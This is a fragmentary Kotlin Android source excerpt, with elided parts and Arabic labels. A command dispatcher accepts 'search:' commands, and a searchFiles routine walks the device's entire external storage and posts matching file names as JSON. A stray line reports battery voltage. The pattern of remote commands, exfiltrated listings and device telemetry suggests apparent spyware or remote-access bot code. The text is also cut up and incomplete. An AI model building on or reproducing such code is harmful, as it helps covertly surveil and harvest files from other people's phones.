    ...
    fun handle(cmd: String) {
        try {
            when {
                ...
                cmd.startsWith("search:")      -> searchFiles(cmd.removePrefix("search:"))
            }
        } catch (e: Exception) {
            postError("handle", e)
        }
...
🔌 الجهد: $volt mV
    ...
    private fun searchFiles(query: String) {
        try {
            ...
            val nameQuery = parts.getOrNull(0) ?: ""
            val maxSize = parts.getOrNull(1)?.toLongOrNull() ?: (100L * 1024 * 1024)

            val root = Environment.getExternalStorageDirectory()
            val results = JSONArray()
            root.walkTopDown()
                .filter { it.isFile && it.name.contains(nameQuery, ignoreCase = true) && it.length() <= maxSize }
                .take(50)
                .forEach { f ->
                    results.put(JSONObject().apply {
                        put("name", f.name)
            ...
            postText("🔎 نتائج البحث", results.toString(2))
        } catch (e: Exception) { postError("search", e) }
    }
